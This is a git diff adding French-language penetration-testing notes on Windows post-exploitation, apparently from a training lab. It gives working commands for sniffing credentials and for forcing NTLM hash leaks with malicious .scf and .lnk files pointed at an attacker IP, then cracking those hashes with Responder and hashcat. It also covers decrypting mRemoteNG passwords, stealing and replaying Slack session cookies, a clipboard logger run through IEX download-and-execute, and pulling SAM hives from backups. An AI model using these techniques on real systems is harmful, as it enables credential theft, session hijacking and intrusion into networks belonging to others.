@@ -2148,6 +2148,239 @@ Si `regedit.exe` est bloqué, utiliser :
 
 ---
 
+# Interacting with Users
+
+**But :** exploiter l’interaction ou la négligence des utilisateurs pour récupérer des credentials ou des hashs NTLM, souvent via partages de fichiers, sniffing ou fichiers piégés.
+
+## Traffic Capture
+
+**But :** capturer des credentials transitant sur le réseau.
+
+- Si **Wireshark** est installé et **Npcap** non restreint → capture possible même en utilisateur standard.  
+- Exemple : capturer credentials FTP ou SMB en clair.  
+- Outils recommandés :
+  - `Wireshark` — interface graphique  
+  - `tcpdump` — capture CLI  
+  - `net-creds` — extraction automatique de creds depuis live traffic ou `.pcap`
+
+**Exemple :**
+- Start capture sur interface locale.
+- Rechercher `USER` / `PASS` / `NTLMSSP` dans Wireshark.
+- Ou automatiser :
+  `sudo python3 net-creds.py -i eth0`
+  
+## Process Command Line Monitoring
+
+**But :** détecter des credentials passés en ligne de commande.
+
+**Script PowerShell simple :**
+```powershell
+while($true){
+$process = Get-WmiObject Win32_Process | Select-Object CommandLine
+Start-Sleep 1
+$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+Compare-Object -ReferenceObject $process -DifferenceObject $process2
+}
+```
+
+
+**Exécution depuis machine attaquante :**
+`IEX (iwr 'http://<attacker_ip>/procmon.ps1')`
+
+**Exemple de résultat :**
+`net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd`
+
+→ récupération de mot de passe **sqlsvc**, utilisable pour **lateral movement** ou **escalade de privilèges**.
+
+## Vulnerable Services (User Interaction)
+**Exemple :** CVE-2019-15752 (Docker Desktop < 2.1.0.1)
+
+- Dossier vulnérable :  
+  `C:\ProgramData\DockerDesktop\version-bin\`
+- Tout utilisateur pouvait y écrire → exécutable lancé lors d’un `docker login` ou restart.  
+- Placer binaire malveillant pour exécution automatique.
+
+→ utile en **long-term engagement** pour obtenir un shell élevé après redémarrage ou action utilisateur.
+
+
+## SCF File Attack (Shell Command File)
+
+**But :** voler un hash NTLMv2 d’un utilisateur explorant un dossier partagé.
+
+**Créer un fichier `@Inventory.scf` :**
+```
+[Shell]
+Command=2
+IconFile=\<attacker_ip>\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+- Placer le fichier sur un **partage accessible (\\fileshare\public)**.  
+- L’utilisateur ouvre le dossier → Windows contacte automatiquement `\\attacker_ip\share`.
+
+**Attaquant :**
+`sudo responder -wrf -v -I tun0`
+
+→ capture NTLMv2 hash :
+`Administrator::WINLPE-SRV01:815c50...:afb6d3b...`
+
+**Cracker le hash :**
+`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
+
+→ `Welcome1`
+
+---
+
+## .LNK File Attack (Windows Server 2019+)
+
+Les `.scf` ne fonctionnent plus sur Server 2019.  
+On utilise un **.lnk malveillant** (ex. généré avec PowerShell).
+
+**Script PowerShell :**
+```powershell
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\<attackerIP>@pwn.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to this directory triggers auth."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+- Placer `.lnk` sur un **partage ou répertoire fréquenté**.
+- Démarrer `Responder` → hash NTLM capturé dès ouverture du dossier.
+
+---
+
+# Pillaging
+
+**But :** récolter un maximum d’informations sensibles sur un hôte compromis (credentials, données internes, configs, backups, cookies, tokens…).
+
+## Sources d’Informations à Explorer
+- **Applications installées** (RDP, backup, IM clients, browsers…)
+- **Services** (web, SMB, DB, AD, CA, monitoring…)
+- **Données sensibles** (logs, captures, fichiers .doc/.xls/password)
+- **Backups** (locaux ou réseau)
+- **Cookies, tokens et sessions** (Slack, Teams, etc.)
+  
+## Identifier les Applications Installées
+
+**CMD rapide :**
+`dir "C:\Program Files"`  
+`dir "C:\Program Files (x86)"`
+
+**PowerShell détaillé :**
+`$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation`  
+`$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation`  
+`$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize`
+
+**Objectif :** repérer applis d’accès distant (ex : mRemoteNG, TeamViewer).
+
+## Exploitation de mRemoteNG
+
+**Chemin par défaut :**  
+`%USERPROFILE%\AppData\Roaming\mRemoteNG\confCons.xml`
+
+**Lister le dossier :**  
+`ls C:\Users\<user>\AppData\Roaming\mRemoteNG`
+
+**Extrait XML utile :**
+- `Username` / `Domain` / `Hostname` visibles.
+- `Password` chiffré avec clé AES et mot de passe maître (souvent `mR3m`).
+
+**Déchiffrer mot de passe :**
+`python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>"`
+
+**Si mot de passe maître personnalisé :**
+`python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>" -p admin`
+
+**Cracker le master password avec une wordlist :**
+`for password in $(cat /usr/share/wordlists/fasttrack.txt); do echo $password; python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>" -p $password 2>/dev/null; done`
+
+## Exploiter les IM Clients (Slack / Teams)
+
+**But :** extraire cookies d’authentification pour usurper une session.
+
+### Cookies Firefox
+- Emplacement : `%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite`
+- Copier la DB :  
+  `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .`
+
+**Extraction cookie Slack :**
+`python3 cookieextractor.py --dbpath "/home/user/cookies.sqlite" --host slack --cookie d`
+
+→ Récupère le cookie `d` (`xoxd-...`)
+
+**Injection cookie dans navigateur :**
+- Installer **Cookie Editor** (Firefox / Chrome).  
+- Naviguer sur `slack.com`, ouvrir l’extension, ajouter cookie `d` avec la valeur extraite.  
+- Rafraîchir → connexion directe à la session utilisateur.
+
+### Cookies Chrome / Chromium
+- Emplacement : `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies`
+- Copier dans le chemin attendu :  
+  `copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"`
+
+**Extraction avec SharpChromium :**
+`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')`  
+`Invoke-SharpChromium -Command "cookies slack.com"`
+
+→ Donne JSON avec cookie `d` Slack → injecter dans navigateur comme plus haut.
+
+## Capture du Presse-papiers
+
+**But :** récupérer des credentials copiés/collés par l’utilisateur.
+
+**Lancer le script :**
+`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')`  
+`Invoke-ClipboardLogger`
+
+**Résultat :**
+```
+https://portal.azure.com
+Administrator@something.com
+Sup9rC0mpl2xPa$$ws0921lk
+```
+
+→ utile pour intercepter creds d’admins, tokens 2FA, etc.
+
+## Backup Servers – Exfiltration et Abus
+
+**But :** utiliser/restaurer des sauvegardes pour extraire des données ou hashes.
+
+### Exemple avec Restic
+**Création du dépôt :**
+`mkdir E:\restic2; restic.exe -r E:\restic2 init`
+
+**Définir mot de passe de repo :**
+`$env:RESTIC_PASSWORD = 'Password'`
+
+**Backup simple :**
+`restic.exe -r E:\restic2\ backup C:\SampleFolder`
+
+**Backup avec snapshot (VSS) :**
+`restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot`
+
+**Lister snapshots :**
+`restic.exe -r E:\restic2\ snapshots`
+
+**Restaurer un snapshot :**
+`restic.exe -r E:\restic2\ restore <snapshot_id> --target C:\Restore`
+
+→ Explorer `C:\Restore\C\` pour récupérer SAM, SYSTEM, web.config, etc.
+
+**But :**
+- Extraire fichiers sensibles (`SAM`, `.ssh`, `web.config`)  
+- Cracker les hashes récupérés  
+- Analyser les credentials dans backups de serveurs/AD
+
+## Outils Utiles
+- [mremoteng_decrypt.py](https://github.com/haseebT/mRemoteNG-Decrypt) 
+- [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) 
+- [Invoke-Clipboard.ps1](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) 
+- [SharpChrome](https://github.com/djhohnstein/SharpChromium)[et](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)
 
 
 
